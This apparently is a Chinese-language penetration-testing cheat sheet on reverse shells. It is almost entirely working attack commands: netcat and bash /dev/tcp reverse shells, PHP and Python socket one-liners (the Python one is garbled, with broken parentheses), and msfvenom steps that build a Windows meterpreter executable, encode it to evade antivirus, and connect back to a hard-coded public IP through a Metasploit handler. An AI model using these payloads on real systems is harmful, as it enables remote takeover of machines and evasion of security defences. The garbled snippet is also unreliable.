<!-- 
title: 08-反弹shell
sort: 
--> 

## 基本

```bash
# 正向shell的实现
nc -lvp 23333 -e /bin/sh		# 服务端
nc 192.168.72.128 23333			# 客户端

# 反向shell
nc -lvp 23333								# 服务端
nc -lvnp 23333							# 阿里报错
# 客户端
nc <ip> <port> -e /bin/sh		
bash -i >& /dev/tcp/ip/23333 0>&1
# php
php -r '$f=fsockopen("ip",port);exec("/bin/sh -i <&3 >&3 2>&3");'
# python
python -c 'import socket,subprocess,os; \
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ip",port
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

## msf

> [安装](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

```bash
# 生成脚本程序
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.128 lport=4444 -f exe > shell.exe

# 使用编码器免杀 msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp lhost=39.106.106.202 lport=7777 x86/shikata_ga_nai -x procdump.exe -i 20 -f exe > shell.exe

# 服务端运行
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 39.106.106.202
set lport 7777
run
```

